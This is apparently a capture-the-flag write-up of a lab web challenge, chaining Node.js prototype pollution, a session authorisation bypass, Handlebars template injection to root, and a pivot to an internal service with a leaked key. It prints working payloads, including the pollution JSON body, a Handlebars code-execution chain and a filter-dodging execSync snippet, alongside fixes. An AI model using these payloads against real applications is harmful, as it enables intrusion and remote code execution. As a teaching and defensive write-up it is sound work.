---
slug: "meridian-fleet-prototype-pollution-to-rce"
title: "Meridian Fleet: prototype pollution to root in five hops"
date: "2026-10-09"
category: "ctf"
tags:
  - "CTF"
  - "Web Security"
  - "Prototype Pollution"
  - "SSTI"
  - "Node.js"
  - "31 Nights of Cyber"
excerpt: "A hand-rolled recursive merge, a session object that inherited from Object.prototype, and a Handlebars filter with a denylist. Four boundaries, one chain."
---

![Meridian Fleet — from a demo login to an internal sidecar](/images/blog/meridian-fleet-prototype-pollution-to-rce/hero.png)

This one is my favourite kind of web challenge: every individual bug is "medium" at best, and the chain is critical. Nothing here is exotic. Prototype pollution is in the [PortSwigger Academy](https://portswigger.net/web-security/prototype-pollution). SSTI is in the [OWASP Top 10 reading list](https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Template_Injection_Prevention_Cheat_Sheet.html). The interesting part is how they fit together.

The setup: Meridian Fleet runs a drone-delivery operations console. A public demo lets anyone log in as a low-privilege operator. Past the operator view there is classified telemetry. The landing page advertises `demo / demo123`.

## The foothold, and the map

```
$ curl -s -c jar -X POST -d 'username=demo&password=demo123' \
    http://meridian-fleet-<port>.labs.perfectroot.io/login \
    -o /dev/null -w '%{http_code}\n'
302

$ curl -s -b jar http://.../api/v2/profile
{"profile":{"username":"demo","role":"operator","displayName":"Demo Operator","bio":""}}
```

The client bundle shipped a source map (`/bundle.js.map`), which listed the API surface: `/api/v2/profile`, `/api/v2/report`, `/diagnostics`, plus two decoys (`/api/v2/search`, `/api/v2/admin/users`) that nginx did not proxy. `/diagnostics` and `POST /api/v2/report` both returned 403 for `operator`.

So there were two doors: make the session an admin, or find a way into the diagnostics console. The profile endpoint was the only one accepting a body.

## The merge that trusted the prototype chain

`routes/profile.js` merged the raw request body into a draft, then copied only the whitelisted display fields onto the session user:

```js
const draft = {};
merge(draft, req.body);

const allowed = ['displayName', 'bio'];
for (const k of allowed) {
  if (draft[k] !== undefined) req.session.user[k] = draft[k];
}
```

That whitelist looks reassuring. It does not matter. The damage happens inside `merge()`:

```js
function merge(target, source) {
  for (const key in source) {
    if (key === '__proto__') continue;      // blocks only the literal key
    const srcVal = source[key];
    if (srcVal !== null && typeof srcVal === 'object' && !Array.isArray(srcVal)) {
      if (target[key] === undefined) target[key] = {};
      merge(target[key], srcVal);
    } else {
      target[key] = srcVal;
    }
  }
  return target;
}
```

Two problems, and they compound:

1. `for...in` walks inherited keys, not just own keys.
2. `target[key]` is resolved through the prototype chain. `target.constructor` is `Object`; `target.constructor.prototype` is `Object.prototype`; the merge writes straight into it.

The literal `__proto__` check is a denylist of one. `constructor.prototype` is the same primitive with a different spelling.

```http
POST /api/v2/profile HTTP/1.1
Content-Type: application/json

{"displayName":{"constructor":{"prototype":{"user":{
  "username":"admin","role":"admin","displayName":"Admin","bio":"","isAdmin":true
}}}}}
```

I confirmed the sink by sending a deeply nested object and reading the stack trace: `RangeError: Maximum call stack size exceeded at merge (/app/lib/merge.js:5:15)`. That is the signature of a recursive merge with no depth limit — and the line number told me exactly which function was recursing.

![The chain, from JSON body to sidecar](/images/blog/meridian-fleet-prototype-pollution-to-rce/flow.png)

## The session object inherits from Object.prototype

`server.js` uses `express-session` and checks:

```js
function requireLogin(req, res, next) {
  if (!req.session.user) return res.redirect('/login');
  next();
}
```

Here is the bit that took a second to appreciate: the session object is a normal JavaScript object, so it inherits from `Object.prototype`. If you send **no `connect.sid` cookie at all**, `req.session` has no own `user` property — but the lookup falls through to the polluted `Object.prototype.user`. The check passes.

```
$ curl -s -o /dev/null -w '%{http_code}\n' http://.../diagnostics
200

$ curl -s http://.../dashboard | grep -o 'Admin[^<]*'
Admin &middot;
```

Dropping the cookie jar *was* the privilege escalation. That is the sort of thing that is obvious in hindsight and deeply weird the first time you see it.

This is why authorisation code should use own-property checks (`Object.hasOwn(req.session, "user")`) or a null-prototype object. `req.session.user` is a truthiness check on a value that can come from anywhere in the prototype chain.

## Handlebars, with a filter made of substrings

The diagnostics console renders a report body as a Handlebars template. `routes/diagnostics.js` enables prototype access and allowlists `constructor`, then applies a filter:

```js
const flat = input.replace(/\s+/g, '').toLowerCase();
return flat.includes('constructor.constructor')
    || flat.includes('process.mainmodule')
    || flat.includes('processenv');
```

`{{7*7}}` is not valid Handlebars path syntax, so the obvious payload fails. But the classic Handlebars RCE chain does not need to write `constructor.constructor` literally:

```handlebars
{{#with "s" as |string|}}
  {{#with split as |conslist|}}
    {{this.pop}}
    {{this.push (lookup string.sub "constructor")}}
    {{this.pop}}
    {{#with string.split as |codelist|}}
      {{this.pop}}
      {{this.push "return 7*7"}}
      {{this.pop}}
      {{#each conslist}}
        {{#with (this.apply null codelist)}}{{this}}{{/with}}
      {{/each}}
    {{/with}}
  {{/with}}
{{/with}}
```

`lookup` retrieves the `Function` constructor without the blocked substring, and `this.apply` invokes it. The report returns `49`. Then it is just a matter of swapping the body for a command runner:

```js
return process['main'+'Module'].require('child_process')
  .execSync(Buffer.from('<base64 shell command>','base64').toString()).toString()
```

`process['main'+'Module']` dodges the `process.mainmodule` check. Base64 keeps shell quoting out of the template string, which matters when your payload is being passed through a templating engine and a JSON body.

Execution was as `root`.

## The pivot

The Dockerfile wrote a build-time secret into `/app/config/internal.json`:

```json
{"recorderKey": "af40deec3a24385ba4a953b6daaca59c",
 "recorderHost": "http://flight-recorder:9000"}
```

The flight recorder is an internal-only Express service. `/api/v1/status` and `/api/v1/telemetry` are open; `/api/v1/blackbox` returns 403 until you send the key in `X-Recorder-Key`.

```
$ curl -s -H 'X-Recorder-Key: af40deec3a24385ba4a953b6daaca59c' \
    http://flight-recorder:9000/api/v1/blackbox
{"classified":true,"archive":"r00t{pr0t0_p0llut10n_ssti_pivot_th3_bl4ckb0x}"}
```

Five hops: operator login → prototype pollution → auth bypass → SSTI → sidecar key. Each one is a separate finding, and each one is fixable on its own. That is what makes chained vulnerabilities so much worse than the sum of their CVSS scores.

## Fixes, in order of leverage

**1. Make the merge safe.**

```js
function merge(target, source) {
  for (const key of Object.keys(source)) {          // own keys only
    if (key === "__proto__" || key === "constructor" || key === "prototype") continue;
    const val = source[key];
    if (val && typeof val === "object" && !Array.isArray(val)) {
      if (!Object.hasOwn(target, key)) target[key] = Object.create(null);
      merge(target[key], val);
    } else {
      target[key] = val;
    }
  }
  return target;
}
```

Or, better, do not hand-roll it. Use `Object.create(null)` for drafts, use a library with a CVE history you can track, and validate the schema with Zod before merging anything.

**2. Fix the authorisation check.** `Object.hasOwn(req.session, "user")`. Also regenerate the session on login and store the role server-side, not in a client-influenced object.

**3. Never compile user input as a template.** If you need templated reports, use a logic-less format with an allowlist of variables. If you must use Handlebars, run it in a sandbox with a restricted context and no prototype access. The [Handlebars security docs](https://handlebarsjs.com/guide/#security) are explicit that templates are code.

**4. Keep sidecar credentials out of the app image.** A build-time key readable from the app container becomes a pivot the moment you get RCE. Use a secret manager, scope the key to the recorder, and rotate it.

## What I would do differently

I spent too long trying to make `{{7*7}}` work. Handlebars is not Jinja; arithmetic is not a path expression. The productive move was to look up the known Handlebars RCE chain and adapt it to the filter, rather than trying to invent syntax from first principles.

The other thing: I initially assumed the whitelist in `profile.js` made the endpoint safe. It does not — the whitelist controls what lands on the session, not what `merge` touches. Always trace the *sink*, not the shape of the response.

## Further reading

- [PortSwigger — Prototype pollution](https://portswigger.net/web-security/prototype-pollution)
- [PortSwigger — Server-side template injection](https://portswigger.net/web-security/server-side-template-injection)
- [Handlebars security guide](https://handlebarsjs.com/guide/#security)
- [express-session docs](https://expressjs.com/en/resources/middleware/session.html)
- [OWASP — Prototype Pollution Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Prototype_Pollution_Prevention_Cheat_Sheet.html)

Next: two signatures on-chain, one nonce reused, and a private key that falls out of the algebra.
